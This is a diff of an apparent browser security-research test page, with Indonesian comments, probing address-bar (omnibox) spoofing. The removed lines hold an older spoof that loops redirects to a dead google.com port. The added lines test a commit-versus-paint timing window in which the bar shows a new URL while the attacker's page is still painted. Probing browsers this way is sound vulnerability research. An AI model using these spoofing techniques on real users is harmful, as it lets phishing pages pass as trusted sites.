@@ -1,14 +1,22 @@
-<!-- 1 | address-bar spoof - nav-timing HOLD | [NO-CLICK] auto saat load
-     GENOME  A=dead-port  B=location=  C=onload  D=S1 omnibox  F=document.write
-     PREDIKAT      omnibox menulis https://www.google.com padahal dokumen ini milik origin penyerang
-     EXPECTED-SECURE  omnibox tetap origin penyerang, atau jujur kembali saat navigasi gagal
-     KONTROL  file 3.html - kalau 3 IKUT berhasil, pembacaanmu salah, bukan mekanisme ini
-     Riset di browser sendiri. Bukan kit phishing: nol form, nol fetch, nol beacon. -->
+<!-- 1 | 2026 · JENDELA COMMIT-vs-PAINT — mesin utama batch ini | [1-CLICK]
+     KENAPA VERSI LAMA GAGAL  seluruh keluarga setInterval(location=...) menyerang URL PENDING.
+     Sejak Chrome ~76 omnibox dicat proses-browser dari URL yang sudah COMMIT, dan renderer
+     tidak boleh mendorong pending-URL. Invarian itu sudah ditutup di tingkat arsitektur.
+     SUMBU BARU  omnibox di-update saat COMMIT. Piksel dokumen LAMA tetap di layar sampai
+     dokumen BARU melukis frame pertamanya. Di antara keduanya ada jendela di mana
+     bar sudah menulis URL tujuan sementara layar masih menampilkan halaman penyerang.
+     Bar tidak berbohong - ia jujur tentang dokumen yang belum ada.
+     YANG DIUKUR  berapa MILIDETIK piksel lama bertahan setelah bar berganti. Itu satu angka,
+     dan angka itulah laporannya. >500ms konsisten = jendela yang bisa dipakai.
+     EXPECTED-SECURE  bar tidak berganti sampai dokumen tujuan melukis frame pertama (~0ms).
+     Nol jaringan, deterministik, tidak bergantung port mati / DNS / CDN. -->
+<h2 style="font:20px system-ui">HALAMAN A — ini konten penyerang</h2>
+<p id=r style="font:12px monospace"></p>
+<button onclick="go(3000)">Navigasi ke B (blokir paint 3 detik)</button>
+<button onclick="go(0)">KONTROL: B tanpa blokir</button>
+<p style="font:13px system-ui">Setelah klik: <b>baca address bar</b> — ia sudah menulis <code>2.html</code>.
+Lalu <b>lihat layar</b> — masih halaman A ini. Screenshot saat keduanya benar. Itu predikatnya.</p>
 <script>
-addEventListener('load', function () {
-  document.write('<h2>SPOOFED &mdash; ini BUKAN google.com</h2><p id=r></p>');
-  document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
-  location = 'https://www.google.com:82';
-  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
-});
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go(ms) { sessionStorage.t0 = Date.now(); location.href = '2.html?block=' + ms; }
 </script>
